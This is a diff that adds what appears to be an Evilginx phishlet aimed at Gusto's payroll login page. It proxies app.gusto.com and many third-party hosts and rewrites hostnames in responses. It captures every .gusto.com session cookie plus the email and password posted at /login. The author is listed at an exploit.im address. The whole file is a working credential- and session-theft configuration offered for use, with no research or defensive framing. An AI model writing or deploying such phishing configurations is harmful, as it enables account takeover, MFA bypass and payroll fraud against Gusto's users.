@@ -1,0 +1,165 @@
+author: '@fghzka@exploit.im'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'd3bnlkto289wdc', orig_sub: 'd3bnlkto289wdc', domain: 'cloudfront.net', session: true, is_landing: false}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'gusto.com', session: true, is_landing: false}
+  - {phish_sub: 'app', orig_sub: 'app', domain: 'gusto.com', session: true, is_landing: true}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'gusto.com', session: true, is_landing: false}
+  - {phish_sub: 'snowplow', orig_sub: 'snowplow', domain: 'gusto.com', session: true, is_landing: false}
+  - {phish_sub: 'api-iam', orig_sub: 'api-iam', domain: 'intercom.io', session: true, is_landing: false}
+  - {phish_sub: 'widget', orig_sub: 'js', domain: 'intercom.io', session: true, is_landing: false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'amplitude.com', session: true, is_landing: false} 
+  - {phish_sub: 'js-agent', orig_sub: 'js-agent', domain: 'newrelic.com', session: true, is_landing: false} 
+  - {phish_sub: 'js', orig_sub: 'js', domain: 'intercomcdn.com', session: true, is_landing: false} 
+  - {phish_sub: 'munchkin', orig_sub: 'munchkin', domain: 'marketo.net', session: true, is_landing: false} 
+  - {phish_sub: 'sessions', orig_sub: 'sessions', domain: 'bugsnag.com', session: true, is_landing: false} 
+  - {phish_sub: 'snap', orig_sub: 'snap', domain: 'licdn.com', session: true, is_landing: false} 
+  - {phish_sub: '110-wox-868', orig_sub: '110-wox-868', domain: 'mktoresp.com', session: true, is_landing: false} 
+  - {phish_sub: '', orig_sub: '', domain: 'hcaptcha.com', session: true, is_landing: false} 
+  - {phish_sub: 'bam-cell', orig_sub: 'bam-cell', domain: 'nr-data.net', session: true, is_landing: false} 
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'optimizely.com', session: true, is_landing: false} 
+  - {phish_sub: 'prod', orig_sub: 'prod', domain: 'gusto-assets.com', session: true, is_landing: false} 
+  - {phish_sub: 'googletagmanager', orig_sub: 'www', domain: 'googletagmanager.com', session: true, is_landing: false}
+  #- {phish_sub: 'googleads', orig_sub: 'googleads', domain: 'g.doubleclick.net', session: true, is_landing: false}
+sub_filters:
+  - {triggers_on: 'prod.gusto-assets.com', orig_sub: 'prod', domain: 'gusto-assets.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'prod.gusto-assets.com', orig_sub: 'prod', domain: 'gusto-assets.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'prod.gusto-assets.com', orig_sub: 'prod', domain: 'gusto-assets.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  
+  - {triggers_on: 'cdn.optimizely.com', orig_sub: 'cdn', domain: 'optimizely.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'cdn.optimizely.com', orig_sub: 'cdn', domain: 'optimizely.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'cdn.optimizely.com', orig_sub: 'cdn', domain: 'optimizely.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  
+  # d3bnlkto289wdc.cloudfront.net
+  - {triggers_on: 'd3bnlkto289wdc.cloudfront.net', orig_sub: 'd3bnlkto289wdc', domain: 'cloudfront.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  #- {triggers_on: 'd3bnlkto289wdc.cloudfront.net', orig_sub: 'd3bnlkto289wdc', domain: 'cloudfront.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'd3bnlkto289wdc.cloudfront.net', orig_sub: 'd3bnlkto289wdc', domain: 'cloudfront.net', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  
+  # d3bnlkto289wdc.cloudfront.net
+  - {triggers_on: 'app.gusto.com', orig_sub: 'app', domain: 'cloudfront.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  #- {triggers_on: 'app.gusto.com', orig_sub: 'app', domain: 'cloudfront.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  #- {triggers_on: 'app.gusto.com', orig_sub: 'app', domain: 'cloudfront.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'app.gusto.com', orig_sub: 'app', domain: 'cloudfront.net', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  
+  
+  - {triggers_on: '', orig_sub: '', domain: 'hcaptcha.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: '', orig_sub: '', domain: 'hcaptcha.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: '', orig_sub: '', domain: 'hcaptcha.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  
+  - {triggers_on: 'bam-cell.nr-data.net', orig_sub: 'bam-cell', domain: 'nr-data.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'bam-cell.nr-data.net', orig_sub: 'bam-cell', domain: 'nr-data.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'bam-cell.nr-data.net', orig_sub: 'bam-cell', domain: 'nr-data.net', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+ 
+  # static
+  - {triggers_on: 'static.gusto.com', orig_sub: 'static', domain: 'gusto.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'static.gusto.com', orig_sub: 'static', domain: 'gusto.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'static.gusto.com', orig_sub: 'static', domain: 'gusto.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  
+  # cdn
+  - {triggers_on: 'cdn.gusto.com', orig_sub: 'cdn', domain: 'gusto.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'cdn.gusto.com', orig_sub: 'cdn', domain: 'gusto.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'cdn.gusto.com', orig_sub: 'cdn', domain: 'gusto.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  # app
+  - {triggers_on: 'app.gusto.com', orig_sub: 'app', domain: 'gusto.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'app.gusto.com', orig_sub: 'app', domain: 'gusto.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'app.gusto.com', orig_sub: 'app', domain: 'gusto.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  # snowplow
+  - {triggers_on: 'snowplow.gusto.com', orig_sub: 'snowplow', domain: 'gusto.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'snowplow.gusto.com', orig_sub: 'snowplow', domain: 'gusto.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'snowplow.gusto.com', orig_sub: 'snowplow', domain: 'gusto.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  - {triggers_on: 'www.googletagmanager.com', orig_sub: 'www', domain: 'googletagmanager.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.googletagmanager.com', orig_sub: 'www', domain: 'googletagmanager.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.googletagmanager.com', orig_sub: 'www', domain: 'googletagmanager.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  
+  - {triggers_on: 'www.googletagmanager.com', orig_sub: 'www', domain: 'gusto.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.googletagmanager.com', orig_sub: 'www', domain: 'gusto.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.googletagmanager.com', orig_sub: 'www', domain: 'gusto.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  
+  #- {triggers_on: 'googleads.g.doubleclick.net', orig_sub: 'googleads', domain: 'gusto.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  #- {triggers_on: 'googleads.g.doubleclick.net', orig_sub: 'googleads', domain: 'gusto.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  #- {triggers_on: 'googleads.g.doubleclick.net', orig_sub: 'googleads', domain: 'gusto.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  
+  #- {triggers_on: 'googleads.g.doubleclick.net', orig_sub: 'googleads', domain: 'g.doubleclick.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  #- {triggers_on: 'googleads.g.doubleclick.net', orig_sub: 'googleads', domain: 'g.doubleclick.net', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  #- {triggers_on: 'googleads.g.doubleclick.net', orig_sub: 'googleads', domain: 'g.doubleclick.net', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  
+  #- {triggers_on: 'online.gusto.com', orig_sub: 'online', domain: 'gusto.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  #- {triggers_on: 'online.gusto.com', orig_sub: 'online', domain: 'gusto.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  #- {triggers_on: 'online.gusto.com', orig_sub: 'online', domain: 'gusto.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  
+    #- {triggers_on: 'my.gusto.com', orig_sub: 'my', domain: 'gusto.com', search: 'https%3a%2f%2fmy%2egusto%2ecom', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  #- {triggers_on: 'my.gusto.com', orig_sub: 'my', domain: 'gusto.com', search: '.gusto', replace: '.whenaresalehost', mimes: ['application/javascript']} 
+  #- {triggers_on: 'my.gusto.com', orig_sub: 'my', domain: 'gusto.com', search: '.com', replace: '.info', mimes: ['application/javascript']}
+  
+  #- {triggers_on: 'agateway.gusto.com', orig_sub: 'agateway', domain: 'gusto.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  #- {triggers_on: 'agateway.gusto.com', orig_sub: 'agateway', domain: 'gusto.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  #- {triggers_on: 'agateway.gusto.com', orig_sub: 'agateway', domain: 'gusto.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  #- {triggers_on: 'agateway.gusto.com', orig_sub: 'agateway', domain: 'gusto.com', search: 'https%3a%2f%2fagateway%2egusto%2ecom', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  
+  # api-iam intercom.io
+  - {triggers_on: 'api-iam.intercom.io', orig_sub: 'api-iam', domain: 'intercom.io', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'api-iam.intercom.io', orig_sub: 'api-iam', domain: 'intercom.io', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'api-iam.intercom.io', orig_sub: 'api-iam', domain: 'intercom.io', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  
+  # widget intercom.io
+  - {triggers_on: 'widget.intercom.io', orig_sub: 'widget', domain: 'intercom.io', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'widget.intercom.io', orig_sub: 'widget', domain: 'intercom.io', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'widget.intercom.io', orig_sub: 'widget', domain: 'intercom.io', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  
+  # js-agent newrelic.com
+  - {triggers_on: 'js-agent.newrelic.com', orig_sub: 'js-agent', domain: 'newrelic.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'js-agent.newrelic.com', orig_sub: 'js-agent', domain: 'newrelic.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'js-agent.newrelic.com', orig_sub: 'js-agent', domain: 'newrelic.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+ 
+  # js intercomcdn.com
+  - {triggers_on: 'js.intercomcdn.com', orig_sub: 'js', domain: 'intercomcdn.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'js.intercomcdn.com', orig_sub: 'js', domain: 'intercomcdn.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'js.intercomcdn.com', orig_sub: 'js', domain: 'intercomcdn.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  
+  # munchkin.marketo.net
+  - {triggers_on: 'munchkin.marketo.net', orig_sub: 'munchkin', domain: 'marketo.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'munchkin.marketo.net', orig_sub: 'munchkin', domain: 'marketo.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'munchkin.marketo.net', orig_sub: 'munchkin', domain: 'marketo.net', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  # sessions.bugsnag.com
+  - {triggers_on: 'sessions.bugsnag.com', orig_sub: 'sessions', domain: 'bugsnag.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'sessions.bugsnag.com', orig_sub: 'sessions', domain: 'bugsnag.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'sessions.bugsnag.com', orig_sub: 'sessions', domain: 'bugsnag.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  
+  # snap.licdn.com
+  - {triggers_on: 'snap.licdn.com', orig_sub: 'snap', domain: 'licdn.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'snap.licdn.com', orig_sub: 'snap', domain: 'licdn.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'snap.licdn.com', orig_sub: 'snap', domain: 'licdn.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  
+  # 110-wox-868.mktoresp.com
+  - {triggers_on: '110-wox-868.mktoresp.com', orig_sub: '110-wox-868', domain: 'mktoresp.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: '110-wox-868.mktoresp.com', orig_sub: '110-wox-868', domain: 'mktoresp.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: '110-wox-868.mktoresp.com', orig_sub: '110-wox-868', domain: 'mktoresp.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+auth_tokens:
+  - domain: '.gusto.com'
+    keys: ['.*,regexp']
+auth_urls:
+credentials:
+  username:
+    key: 'user[email]'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'user[password]'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'app.gusto.com'
+  path: '/login'
+js_inject:
+  - trigger_domains: ["app.gusto.com"]
+    trigger_paths: ["/login"]
+    trigger_params: []
+    script: |
+      function (){
+      
+      }
+      
